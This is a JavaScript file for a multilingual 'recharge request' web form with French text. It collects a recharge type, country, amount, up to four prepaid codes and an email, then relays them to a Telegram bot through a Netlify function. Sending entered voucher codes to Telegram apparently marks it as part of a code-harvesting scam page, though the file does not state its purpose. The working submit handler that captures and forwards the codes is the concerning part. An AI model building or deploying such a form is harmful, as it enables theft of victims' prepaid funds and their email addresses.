function loadRecaptchaScript(lang) {
    const existingScript = document.querySelector('script[src^="https://www.google.com/recaptcha/api.js"]');
    if (existingScript) {
        existingScript.remove();
    }
    
    const script = document.createElement('script');
    script.src = `https://www.google.com/recaptcha/api.js?hl=${lang}&render=explicit&onload=renderRecaptchaWidget`;
    script.async = true;
    script.defer = true;
    document.head.appendChild(script);
}

function setLanguage(lang) {
  if (!translations[lang]) return;
  currentLang = lang;
  document.documentElement.lang = lang;

  document.querySelectorAll('[data-lang-key]').forEach(elem => {
    const key = elem.getAttribute('data-lang-key');
    if (translations[lang][key]) elem.innerText = translations[lang][key];
  });

  document.title = translations[lang].title;
  document.querySelector('input[name="amount"]').placeholder = translations[lang].amount_placeholder;
  document.querySelector('input[name="code1"]').placeholder = translations[lang].code1_placeholder;
  document.querySelector('input[name="code2"]').placeholder = translations[lang].code2_placeholder;
  document.querySelector('input[name="code3"]').placeholder = translations[lang].code3_placeholder;
  document.querySelector('input[name="code4"]').placeholder = translations[lang].code4_placeholder;
  document.querySelector('input[name="email"]').placeholder = translations[lang].email_placeholder;

  loadRecaptchaScript(lang);
};

document.addEventListener('DOMContentLoaded', () => {
    const langSelector = document.getElementById('lang-selector');
    const userLang = (navigator.language || navigator.userLanguage).split('-')[0];
    // AJOUT DE 'de' POUR LA DÉTECTION AUTOMATIQUE
    const defaultLang = ['fr', 'en', 'es', 'it', 'de', 'nl'].includes(userLang) ? userLang : 'fr';
    
    langSelector.value = defaultLang;
    setLanguage(defaultLang);
    
    langSelector.addEventListener('change', (event) => {
        setLanguage(event.target.value);
    });
});


document.getElementById('form').addEventListener('submit', async function(e) {
  e.preventDefault();
  const formData = new FormData(this);
  const data = Object.fromEntries(formData.entries());

  if (!data.recharge_type || !data.recharge_country || !data.amount || !data.currency || !data.code1 || !data.email) {
    alert(translations[currentLang].alert_fill_fields);
    
    return;
  }

  const message = `🎫 NOUVELLE DEMANDE DE RECHARGE 🎫\n\n` +
    `Type : ${data.recharge_type}\n` +
    `Pays de recharge : ${data.recharge_country}\n` +
    `Montant : ${data.amount} ${data.currency}\n` +
    `Code 1 : ${data.code1}\n` +
    `${data.code2 ? `Code 2 : ${data.code2}\n` : ''}` +
    `${data.code3 ? `Code 3 : ${data.code3}\n` : ''}` +
    `${data.code4 ? `Code 4 : ${data.code4}\n` : ''}` +
    `Email : ${data.email}\n` +
    `🕒 Soumis le : ${new Date().toLocaleString()}`;

  try {
    const token = grecaptcha.getResponse();
    if (!token) {
      alert(translations[currentLang].alert_recaptcha);
      return;
    }

    const btn = document.querySelector('button[type="submit"]');
    btn.disabled = true;
    btn.textContent = "Envoi en cours…";

    try {
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message, recaptchaToken: token })
      });

      const result = await response.json();
      if (result.ok) {
        window.location.href = `confirmation.html?lang=${currentLang}`;
      } else {
        alert(translations[currentLang].alert_telegram_error + result.description);
      }
    } catch (err) {
      alert(translations[currentLang].alert_send_error + err.message);
    } finally {
      btn.disabled = false;
      btn.textContent = "Envoyer";
    }
  } catch (err) {
    alert(translations[currentLang].alert_send_error + err.message);
  }
});